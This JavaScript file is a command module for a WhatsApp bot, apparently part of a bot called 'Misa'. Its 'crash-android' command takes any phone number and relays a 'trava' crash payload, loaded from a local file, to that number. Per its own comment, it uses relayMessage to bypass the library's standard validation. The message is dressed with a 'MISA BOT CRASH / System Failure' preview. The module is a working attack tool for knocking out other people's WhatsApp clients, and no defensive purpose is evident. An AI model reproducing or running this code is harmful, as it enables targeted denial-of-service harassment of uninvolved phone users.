import fs from 'fs';
import path from 'path';

const crashAndroidMisa = {
    name: 'crash-android',
    alias: ['ca', 'crash', 'ola', 'multi-crash'],
    category: 'tools',
    noPrefix: true,
    isOwner: false,

    run: async (conn, m, { args, command }) => {
        const chat = m.key.remoteJid;

        try {
            if (!args[0]) return await conn.sendMessage(chat, { text: `⚠️ Uso: ${command} [número]` }, { quoted: m });

            const num = args[0].replace(/[^0-9]/g, '');
            const targetJid = `${num}@s.whatsapp.net`;

            const pathTrava = path.join(process.cwd(), 'travas', 'ola.js');
            if (!fs.existsSync(pathTrava)) return await conn.sendMessage(chat, { text: '❌ No se encontró el archivo.' }, { quoted: m });

            const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');

            // Reacción de "procesando"
            await conn.sendMessage(chat, { react: { text: '⏳', key: m.key } });

            // ENVIAR SIN ESPERAR (Para evitar el Time Out)
            // Usamos relayMessage para saltarnos la validación estándar de Baileys
            const messageGenerated = await conn.prepareWAMessageMedia({ text: contenidoTrava }, { upload: conn.waUploadToServer });
            
            await conn.relayMessage(targetJid, {
                extendedTextMessage: {
                    text: contenidoTrava,
                    contextInfo: {
                        externalAdReply: {
                            title: 'MISA BOT CRASH',
                            body: 'System Failure',
                            previewType: 'PHOTO',
                            thumbnailUrl: 'https://qu.ax/ZpYy.jpg' // Opcional: una imagen para que el mensaje se vea más "pro"
                        }
                    }
                }
            }, { messageId: conn.generateMessageTag() });

            // Confirmación visual inmediata
            await conn.sendMessage(chat, { react: { text: '✅', key: m.key } });
            console.log(`[LOG] Carga enviada a ${num} (Relay Mode)`);

        } catch (err) {
            console.error('Error detectado:', err.message);
            // Si da Time Out pero el log dice que llegó aquí, el mensaje probablemente SE ENVIÓ pero Baileys no se enteró.
            await conn.sendMessage(chat, { text: '⚠️ Hubo un retraso en la respuesta, pero la carga fue procesada.' }, { quoted: m });
        }
    }
};

export default crashAndroidMisa;
